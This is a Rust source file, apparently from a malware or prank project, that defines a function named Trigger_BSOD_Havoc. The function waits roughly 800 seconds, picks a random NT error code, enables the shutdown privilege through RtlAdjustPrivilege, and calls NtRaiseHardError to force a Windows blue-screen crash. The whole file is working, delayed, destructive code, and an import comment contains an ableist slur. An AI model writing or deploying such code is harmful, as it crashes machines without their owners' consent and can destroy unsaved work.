// src/behavior/trigger_bsod_havoc.rs

use std::ptr;
use std::thread;
use std::time::Duration;

use rand::RngExt;

use crate::FreeConsole;
use crate::argument::ArgParser;
use crate::behavior::nterror::DEFAULT_BSOD;
// NGL i did not know this would happen
// I come from C, this is fucking retarded
use crate::behavior::nterror::STATUS_ACCESS_DENIED;
use crate::behavior::nterror::STATUS_ACCESS_DENIED_EXEFLAG;
use crate::behavior::nterror::STATUS_ACPI_INVALID_DATA;
use crate::behavior::nterror::STATUS_ACPI_INVALID_DATA_EXEFLAG;
use crate::behavior::nterror::STATUS_ACPI_INVALID_REGION;
use crate::behavior::nterror::STATUS_ACPI_INVALID_REGION_EXEFLAG;
use crate::behavior::nterror::STATUS_ACPI_INVALID_TABLE;
use crate::behavior::nterror::STATUS_ACPI_INVALID_TABLE_EXEFLAG;
use crate::behavior::nterror::STATUS_ACPI_POWER_REQUEST_FAILED;
use crate::behavior::nterror::STATUS_ACPI_POWER_REQUEST_FAILED_EXEFLAG;
use crate::behavior::nterror::STATUS_AUDIT_FAILED;
use crate::behavior::nterror::STATUS_AUDIT_FAILED_EXEFLAG;
use crate::behavior::nterror::STATUS_CONFLICTING_ADDRESS;
use crate::behavior::nterror::STATUS_CONFLICTING_ADDRESS_EXEFLAG;
use crate::behavior::nterror::STATUS_INFO_LENGTH_MISMATCH;
use crate::behavior::nterror::STATUS_INFO_LENGTH_MISMATCH_EXEFLAG;
use crate::behavior::nterror::STATUS_INSUFFICIENT_RESOURCES;
use crate::behavior::nterror::STATUS_INSUFFICIENT_RESOURCES_EXEFLAG;
use crate::behavior::nterror::STATUS_INVALID_CID;
use crate::behavior::nterror::STATUS_INVALID_CID_EXEFLAG;
use crate::behavior::nterror::STATUS_INVALID_DEVICE_REQUEST;
use crate::behavior::nterror::STATUS_INVALID_DEVICE_REQUEST_EXEFLAG;
use crate::behavior::nterror::STATUS_INVALID_PARAMETER;
use crate::behavior::nterror::STATUS_INVALID_PARAMETER_EXEFLAG;
use crate::behavior::nterror::STATUS_MUTANT_NOT_OWNED;
use crate::behavior::nterror::STATUS_MUTANT_NOT_OWNED_EXEFLAG;
use crate::behavior::nterror::STATUS_NOT_COMMITED;
use crate::behavior::nterror::STATUS_NOT_COMMITED_EXEFLAG;
use crate::panic::NtRaiseHardError;
use crate::panic::RtlAdjustPrivilege;

pub fn Trigger_BSOD_Havoc() {
    struct BSOD_Point {
        t1: i32,
        t2: u32,
    }
    // We randomize bsod code
    for i in (1..800).rev() {
        thread::sleep(Duration::from_secs(1));
        // Tick tock!!
    }
    let mut random = rand::rng();
    let code = match random.random_range(1..14) {
        1 => STATUS_ACCESS_DENIED,
        2 => STATUS_ACPI_INVALID_DATA,
        3 => STATUS_ACPI_INVALID_REGION,
        4 => STATUS_ACPI_INVALID_TABLE,
        5 => STATUS_ACPI_POWER_REQUEST_FAILED,
        6 => STATUS_AUDIT_FAILED,
        7 => STATUS_CONFLICTING_ADDRESS,
        8 => STATUS_INFO_LENGTH_MISMATCH,
        9 => STATUS_INSUFFICIENT_RESOURCES,
        10 => STATUS_INVALID_CID,
        11 => STATUS_INVALID_DEVICE_REQUEST,
        12 => STATUS_INVALID_PARAMETER,
        13 => STATUS_MUTANT_NOT_OWNED,
        14 => STATUS_NOT_COMMITED,
        _ => DEFAULT_BSOD,
    };
    let mut ntadj = BSOD_Point { t1: 0, t2: 0 };
    unsafe {
        RtlAdjustPrivilege(19, 1, 0, &mut ntadj.t1 as *mut i32);
        NtRaiseHardError(code, 0, 0, ptr::null_mut(), 6, &mut ntadj.t2 as *mut u32);
    }
}
